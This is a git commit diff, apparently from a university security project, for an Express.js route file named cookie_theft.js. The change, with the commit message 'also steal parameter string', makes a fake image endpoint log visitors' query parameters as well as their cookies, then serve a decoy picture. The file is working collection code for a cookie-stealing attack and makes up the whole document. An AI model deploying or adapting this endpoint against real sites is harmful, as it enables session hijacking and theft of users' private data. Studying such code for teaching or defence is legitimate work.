c7be8a3e4869af06a824e9b96c630ef06709ddba
Kaicheng Tan <tan95@cs.washington.edu>
2017-05-09 16:03:02 -0700

    also steal parameter string

--- routes/cookie_theft.js
+++ routes/cookie_theft.js
@@ -1,11 +1,15 @@
 var express = require('express');
 var router = express.Router();
+const path = require('path');
 
 router.get('/fake.jpg', function(req, res, next) {
   console.log('\n\nCookie received by cookie theft:');
-  console.log(JSON.stringify(req.cookies, null, 2), '\n\n');
+  console.log(JSON.stringify(req.cookies, null, 2));
+  console.log('Query Strings:');
+  console.log(JSON.stringify(req.query, null, 2));
   // res.send('Your cookie is parsed :)');
-  res.sendfile('public/images/pikachu.jpg');
+  // res.sendfile('public/images/pikachu.jpg');
+  res.sendFile(path.join(__dirname, '..', 'public', 'images', 'pikachu.jpg'));
 });
 
 module.exports = router;
